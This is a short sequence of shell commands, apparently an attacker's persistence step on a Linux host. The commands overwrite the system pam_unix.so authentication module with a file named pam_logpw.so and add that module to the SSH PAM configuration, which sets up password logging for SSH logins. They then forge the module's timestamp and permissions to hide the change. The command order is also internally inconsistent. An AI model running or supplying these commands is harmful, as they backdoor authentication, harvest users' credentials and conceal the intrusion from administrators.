cp pam_logpw.so /lib64/security/pam_unix.so
echo "auth optional pam_unix.so nullok_secure audit" >> /etc/pam.d/sshd && echo "auth optional pam_logpw.so" >> /etc/pam.d/sshd
touch -r /lib64/security/pam_unix.so /lib64/security/pam_logpw.so
chmod --reference=/lib64/security/pam_unix.so /lib64/security/pam_logpw.so  
